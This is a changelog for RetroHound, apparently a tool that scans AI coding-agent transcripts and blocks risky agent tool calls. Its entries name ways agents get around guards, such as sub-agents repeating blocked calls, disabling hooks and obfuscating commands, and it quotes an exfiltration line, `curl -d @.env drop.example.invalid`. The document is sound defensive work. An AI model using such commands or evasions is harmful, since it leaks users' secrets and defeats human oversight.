# Changelog

All notable changes to this project are listed here. The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/)
and versions follow [Semantic Versioning](https://semver.org/).

## [Unreleased]

### Added
- `purge --all` also deletes the hook log and the rules caches in `~/.retrohound` (regular files by those names only).
- Rule `secrets_read_then_egress_project` (hunt): a secret read and network egress in different sessions of one project
  within 10 minutes, the nested agent CLI case. Correlations may now group by `project_path` instead of `session_id`,
  with a timespan of 1h at most.

### Changed
- Releases are staged on npm (`npm stage publish`) and go public only after a maintainer approves them with 2FA.
- The GitHub Action and the CI and release workflows pin `actions/checkout`, `actions/setup-node` and
  `oven-sh/setup-bun` by commit SHA.
- The Homebrew formula and the Velociraptor artifact carry the SHA-256 of the 0.3.0 tarball.

### Fixed
- The live hook enforces an Edit to an agent settings file (`settings.json`, `settings.local.json`, Codex
  `config.toml`) whose old text sits inside a hooks, statusLine or notify section of the file as it is, even when the
  edit names no hook key.
- `command_line_unquoted` decodes bash ANSI-C quoting (`$'\x63url'`, octal, `\u`) and collapses runs of blanks, so
  those spellings no longer slip past the exec rules.
- A shell command whose network client names a host without a scheme (`curl -d @.env drop.example.invalid`, `ssh
  user@host`) now sets the event's domain.
- `--anonymize` also hashes URL, ssh, scp and rsync hosts and git remote owner/repo names.

## [0.3.0] - 2026-11-12

### Added
- `rules convert -t <backend> --pipeline ecs|ocsf [rules...]`: converts rules to SIEM queries over the `ndjson-ecs` /
  `ndjson-ocsf` exports with a sigma-cli already on your PATH (nothing is installed or downloaded; without it, exit 2).
  The pySigma pipelines ship in `integrations/pysigma/`; fields an export lacks and derived fields fail the rule.
- `scan` writes a footprint report by default: `index.footprint.html` next to the index (named after it), one offline page (no scripts,
  nothing fetched) with everything the index holds about the agents on this machine: trust in the data, activity,
  agent/project/session/sub-agent tree, MCP servers, hooks, skills and plugins, domains, secrets to rotate,
  permission modes, blocked calls and findings. `--report <file>` moves it, `--no-report` skips it; `--no-index` and
  machine formats never write it, and it may not overwrite the index. `purge` deletes it with the index.
- Footprint report: configured versus used. The agents' config files (MCP servers, hooks, skills, plugins; user,
  project, local and managed scopes) are read for names and hook commands only, and set against what transcripts show
  was used: never-used items are flagged, and used items that no config file sets up now are listed.
- Config snapshots: every indexed scan stores what the agents' config files set up (name, scope, file and a sha256 of
  the masked entry, never a value; the last 10 scans kept, outside the hash chain). The footprint report shows what is
  new, changed and removed since the scan before. Index schema version 4; the first scan upgrades it.
- Codex collector (`codex/v4`): MCP tool calls are indexed as `mcp` events (`mcp__<server>__<tool>`, `mcp_server`,
  `mcp_tool`, arguments, result, outcome), so MCP rules fire on Codex and the footprint shows which Codex MCP servers
  were used. Codex rollouts are re-read once.
- Codex collector (`codex/v5`): file edits made with `apply_patch` are indexed as `file_event`s, one per changed file,
  with the content written, so the file rules (agent config writes, MCP servers added, secrets written) fire on
  Codex edits, not only on its shell commands.
- `scan --format attack-layer`: a MITRE ATT&CK Navigator layer (format 4.5) of the techniques this scan's findings map
  to, scored by finding count, with the rules behind each technique in its comment.
- Footprint: a configured Claude Code plugin also counts the calls on its own MCP servers (`plugin_<plugin>_<server>`),
  each call once next to its attributed calls and its skills' calls.
- Derived fields `first_seen_project` and `first_seen_global` (ADR 0016): true on the earliest event carrying a
  domain, MCP server, hook command or skill/plugin, computed by `scan` (and `rules test`) before rules run, never
  stored. Events in the first 14 days of the data never count. Rules reading them declare
  `x-retrohound: {requires: [first_seen]}` and stay in the hunt lane.
- Six hunt rules on them: a new MCP server with a secret read or egress, a new hook command with a blocked call or
  egress, a domain new to the project after a secret read, a new skill or plugin then its MCP call.
- `git-secrets`: secrets an agent saw (by fingerprint) that are in the local git history of the projects it worked
  in; exit 1 when any is. Reads `git log` only, never fetches, never prints a value.
- `docs/owasp-asi.md`: the rules behind each OWASP Top 10 for Agentic Applications risk, kept in sync by a test.
- Integrations, not published anywhere: Wazuh rules, Splunk `props.conf`, a Velociraptor artifact, a GitHub Action
  (`action.yml`) and a Homebrew formula template; see `docs/integrations.md`.
- Rules for repo-local git code execution: writes to `.git/hooks`, `.husky` and `.envrc`, and `git config` of the
  hooks path, fsmonitor, pager or filter drivers.
- `exec_nested_agent_cli` (enforce): an agent starting another agent CLI with its settings or home moved
  (`--settings`, `--setting-sources`, `CLAUDE_CONFIG_DIR`, `CODEX_HOME`); `exec_nested_agent_cli_headless` (hunt): one
  started headless (`-p`, `exec`), which splits session-scoped correlations.

### Changed
- `ndjson-ocsf`: each evidence carries `ai_agent` (OCSF 1.9.0) and, for MCP calls, `api.service.name` /
  `api.operation`. `unmapped.retrohound.ai_agent` is gone: read `evidences[].ai_agent`. The `ai_operation` profile
  is not declared: OCSF does not allow it on Detection Finding.
- `scan --agent all` indexes every agent before evaluating any, so cross-agent context is complete.
- Agent-config rules (`files_mcp_server_added`, `control_plane_agent_config_*`) also cover Codex (`.codex/config.toml`
  `[mcp_servers]`, `[hooks]` and `base_url`, `.codex/hooks.json`) and Antigravity (`.gemini/config/mcp_config.json`,
  `hooks.json`, project `.agents/`) config files.
- Rule regexes with nested quantifiers (also under a bounded repeat such as `(\w+\s?){1,60}`) and `fieldref` combined
  with `re` are refused at load.
- `--anonymize` hashes every directory under a home (also `$HOME`, `${HOME}`, `%USERPROFILE%`), keeps generic and
  credential file names, and keys the ids per pack, so they cannot be confirmed with a word list or linked across
  shares.
- `purge` refuses a file that is not a RetroHound index, and says the hook log is kept.
- The GitHub Action installs and runs from the runner's temp directory, so a checkout's `.npmrc` is never read; the
  release job pins npm to an exact version.
- MCP tool descriptions and server instructions say returned transcript values are data, never instructions.

### Fixed
- `incident` and `wrapped` pages: no whole-page mask pass after escaping, which could swallow markup after a short
  `token=` value. Every value was already masked.
- Collectors: a transcript line nested too deep to handle loses only itself instead of the rest of the file (Claude
  Code) or the whole file (Codex, Antigravity); tool input too deep to serialize is kept to depth 64 so secrets next
  to it are still found. Codex `.jsonl.zst` rollouts decompress with a 256 MiB cap.
- Heredoc bodies move out of `command_line` only when everything before them is cd, git, gh or a plain reader, with no
  PATH, preload or editor override; a stored body still sets url and domain.
- Grep with a path or glob is a file read, and `secrets_read_secret_file` matches Grep globs, so reading `.env` or a
  credentials file through Grep raises a finding.
- Shell commands take url and domain from the first URL that leaves the machine, so a loopback URL listed first no
  longer hides the host after it.
- Rule regexes are no longer evaded by padding a field past 8 KiB: bounded patterns test the whole field, unbounded
  ones overlapping windows. This matters most for the live hook.
- An extra rules pack can no longer silence another file's rules through a non-generating correlation; first-seen
  baselines skip events whose timestamp is not ISO.
- Live hook: denies writes to its own state (`~/.retrohound`) and to rules directories before any rule or ignore file
  is read (case-insensitively on macOS and Windows); an ignore file that fails to load is skipped with a warning
  instead of switching enforcement off; Codex `apply_patch` reaches it as file events; the enforce pre-filter accepts
  a quoted lane.
- `hook install` checks directories that hold symlinked entries and the shipped rules directory, and only claims hook
  handlers with its own exact flags.
- Agent-config rules block shell overwrites of agent settings (`>`, `tee`, `sponge`), `find -delete` under config
  directories, in-place edits that remove or downgrade a hook, staged files copied or linked into a config directory,
  JSON `\u` escapes, and command-running settings (`statusLine`, AWS and OTEL helpers, `disableAllHooks`, Codex
  `notify`).
- `control_plane_disable_safety` no longer skips a line that starts with echo/cat/grep, and covers Codex and Gemini
  safety-off settings and flags; the LLM-endpoint allowlist is no longer fooled by userinfo
  (`https://localhost:1@host`).
- Shell-execution rules catch upper-case binaries, `|&`, `source /dev/stdin`, `${IFS}`, combined short flags,
  `+ref:ref` force pushes, `docker container run` and spaced `git config`.
- `secrets_read_then_egress`: loopback only when every host in the call is loopback, so the word in a header or
  `--noproxy` no longer hides egress; a sample file next to a real one (`cat .env .env.example`) counts as a secret
  read.
- Masking covers PGP private key blocks, Google, npm and Hugging Face tokens, Basic and other Authorization schemes
  (also URL-encoded), `curl -u`, `mysql -p`, `--password`, `DB_PASS`/`MYSQL_PWD` and JSON-escaped password fields;
  JSON reports mask object keys too.
- Table, `show`, `query`, preflight and incident output show control characters from transcripts and repos as `\xNN`,
  so terminal escapes and CI workflow commands in collected data do not take effect.
- ECS and OCSF exports always carry a valid ISO 8601 timestamp; a non-ISO one is rewritten or replaced by the scan
  end, the original kept in `retrohound.raw_ts`.
- The default incident folder stays in the current directory whatever the session id holds; the wrapped card ships the
  same CSP as the other offline pages.
- Footprint lists config files symlinked out of their directory and command-running settings, and a Codex TOML comment
  containing `'''` no longer hides later tables.
- `scan` and `verify` refuse an index whose schema was changed by hand (for example a trigger that drops events); a
  foreign `--db` is refused before anything in it is changed. `verify` recomputes sessions from events and fails on a
  deleted or edited sessions row; `verify --head` counts rewrites of existing rows separately. The incident pack reads
  in one snapshot, so `index_head` matches its rows.
- MCP `query` runs in a child process stopped after 5 seconds, so an endless recursive CTE cannot hang the server or
  fill memory.
- `git-secrets` no longer runs a submodule's diff drivers; `preflight` no longer reads through symlinked directories
  out of the repo or builds regexes from workspace globs.


## [0.2.0] - 2026-11-09

### Added
- `incident <session|finding>`: one folder to hand over (incident.json, an offline index.html and a sha256 manifest)
  with the timeline, the sub-agent tree, blocked versus succeeded calls, secrets to rotate and where the evidence came
  from (source-file sha256, first and last seen). Works on sessions whose transcripts are gone; `--anonymize` hides paths.
  `incident.json` records the index's chain head (`index_head`), so the pack can be checked against the index later.
- `--extra-rules <dir>` (repeatable) for `scan`, `rules` and `hook`: your own rules on top of the shipped set.
- `preflight` reads each workspace package's package.json in a monorepo (root `workspaces` or pnpm-workspace.yaml).
- Tamper-evident index: every write to events, findings and indexed files is chained by sha256 (ADR 0015).
  `verify` checks the chain and prints its head; `verify --head <hash>` fails if a head recorded elsewhere is gone,
  and lists what was added since it. Existing indexes start their chain on the next scan.
- Blocked-call breakdown in `scan` (table and `scan.blocked_breakdown` in JSON): calls the agent's own guard blocked,
  by denial kind (main conversation vs sub-agent), category, skill/MCP/plugin attribution and project.
- Rules `blocked_then_other_tool_secret_read` (a blocked secret-file read, then the same done with another kind of
  tool) and `blocked_then_subagent_same_call` (a call blocked in the main conversation, then made by a sub-agent).

### Changed
- `scan`, `show` and `wrapped` refuse a `--db` that is another program's SQLite database instead of adding
  RetroHound's tables to it.
- `hook run` is faster: the rule set is cached by file stat and the CLI skips loading other commands (p95 33 -> 21.5 ms).

## [0.1.0]

First public release.

- `scan` for Claude Code, Codex CLI and Antigravity CLI transcripts (`--agent`), including sub-agents and calls the
  agent blocked; masked, append-only SQLite index that keeps sessions after the agent deletes them.
- 46 Sigma v2.1 rules on a proposed `ai_coding_agent` logsource, plus 6 helper rules for correlations, each with
  positive and negative tests (`rules test`).
- `show`, `query`, `wrapped` (HTML report or SVG card), `purge`, `rules list|show|test`.
- Output as table, JSON, SARIF 2.1.0, and ECS or OCSF NDJSON.
- `preflight`: check a cloned repo's agent surface before opening it with an agent.
- `hook`: optional live PreToolUse guard (log, confirm or block) running only `enforce`-lane rules; fails open, checks
  its install path.
- `mcp`: read-only MCP server over the index.
- Ignore file for known-benign findings. Zero network calls, secrets masked everywhere.
